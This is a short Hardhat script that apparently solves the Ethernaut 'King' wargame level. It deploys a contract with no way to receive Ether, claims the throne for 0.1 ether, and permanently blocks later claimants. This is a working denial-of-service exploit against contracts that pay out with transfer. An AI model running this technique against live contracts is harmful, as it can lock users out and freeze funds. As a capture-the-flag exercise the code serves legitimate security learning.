const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x878526d7C6A4d52F896Df34A24A49eb6320309CD'
const abi = ["function prize() public view returns (uint)"]

async function hack(contract, signer) {
    // The king.transfer function in the game contract only works if the king can receive Ether.
    // This is a safe bet for all EOAs, but not for contracts.
    const PermanentKing = await ethers.getContractFactory("PermanentKing");
    const permanentKing = await PermanentKing.deploy(contract.address);
    await permanentKing.deployed();
    console.log("PermanentKing Deployed To:", permanentKing.address);

    const prize = await contract.prize();
    console.log(`Prize to Beat: ${ethers.utils.formatEther(prize)}`);

    // We have our contract with no receive() function takeover as the new permanent king.
    const tx = await permanentKing.takeKingship({value: ethers.utils.parseEther('0.1'), gasLimit: 2000000});
    await tx.wait();
    console.log('Your contract is now the king... forever :)')
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})